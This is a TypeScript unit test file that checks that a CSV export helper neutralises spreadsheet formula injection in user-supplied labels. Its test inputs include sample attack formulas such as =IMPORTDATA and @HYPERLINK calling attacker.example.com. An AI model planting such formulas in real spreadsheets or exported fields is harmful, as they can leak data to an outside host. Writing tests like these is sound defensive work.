import { describe, it, expect } from 'vitest';
import type { PlanAuditRow } from '../../../../shared/math/planningAudit.js';
import { auditRowsToCsv, csvCell } from '../PlanAuditPanel.js';

/**
 * The label column flows through to CSV unchanged. A user's lump-sum label
 * is the only cell in the audit table that is fully attacker-controlled, so
 * we test injection defense there first, plus the underlying csvCell helper.
 */
describe('csvCell — formula injection defense', () => {
  it('defangs =IMPORTDATA by prefixing a tab', () => {
    const out = csvCell('=IMPORTDATA("https://attacker.example.com/x")');
    // The whole cell contains a comma, so it ends up quoted; the leading TAB
    // sits inside the quotes. Either way, no spreadsheet evaluates it.
    expect(out.startsWith('"\t=')).toBe(true);
    expect(out.endsWith('")"')).toBe(true);
  });

  it('defangs leading + (e.g. +SUM(1,2))', () => {
    const out = csvCell('+SUM(1,2)');
    expect(out.startsWith('"\t+SUM')).toBe(true);
  });

  it('defangs leading @ (e.g. @HYPERLINK(...))', () => {
    const out = csvCell('@HYPERLINK("https://attacker.example.com","click")');
    expect(out.startsWith('"\t@HYPERLINK')).toBe(true);
  });

  it('defangs leading -', () => {
    // A bare leading hyphen (e.g. someone typing "-5K bonus" as a label)
    // is treated as a formula start in Excel, so we still defang it.
    // The TAB prefix forces quoting so it survives the CSV round-trip.
    const out = csvCell('-1+1');
    expect(out).toBe('"\t-1+1"');
  });

  it('defangs leading TAB and CR (less common, still triggers eval)', () => {
    expect(csvCell('\t=A1')).toBe('"\t\t=A1"');
    expect(csvCell('\r=A1')).toBe('"\t\r=A1"');
  });

  it('passes through a benign label unchanged', () => {
    expect(csvCell('Tax refund')).toBe('Tax refund');
  });

  it('still quotes commas/newlines/quotes as before', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('defangs and quotes when both apply', () => {
    // Leading "=" requires defang; embedded comma forces quoting; both rules
    // compose without losing either protection.
    const out = csvCell('=A1,A2');
    expect(out).toBe('"\t=A1,A2"');
  });
});

describe('auditRowsToCsv — full row injection defense', () => {
  const baseRow: PlanAuditRow = {
    row_number: 1,
    date_iso: '2027-04-15',
    contribution_type: 'lump',
    label: 'Tax refund',
    amount_usd: 20_000,
    btc_price_used: 133_000,
    power_law_price: 174_000,
    multiplier: 0.7644,
    btc_bought: 0.15037594,
    cumulative_btc: 0.15037594,
    cumulative_deployed: 20_000,
    fiat_value: 20_000,
    notes: 'Manual lump sum.',
    model_id: 'catch_up_power_law_b1m_1x_2028-06-30',
    spot_anchor_date: '2026-04-29',
    spot_anchor_price: 75_800,
    catchup_date: '2028-06-30',
    catchup_price: 248_853.82,
  };

  it('does not let an =IMPORTDATA label leak through unescaped', () => {
    const malicious: PlanAuditRow = {
      ...baseRow,
      label: '=IMPORTDATA("https://attacker.example.com/x")',
    };
    const csv = auditRowsToCsv([malicious]);
    // Defanged: leading "=" must be neutralized before Excel parses it.
    // The tab can be either bare ("\t=...") or inside a quoted field ('"\t=..."'),
    // but the formula must NEVER appear at the start of a cell unprefixed.
    expect(csv).toMatch(/(?:^|,)"?\t=IMPORTDATA/);
    expect(csv).not.toMatch(/(?:^|,)=IMPORTDATA/);
  });

  it('preserves benign labels exactly', () => {
    const csv = auditRowsToCsv([baseRow]);
    expect(csv).toContain(',Tax refund,');
  });
});
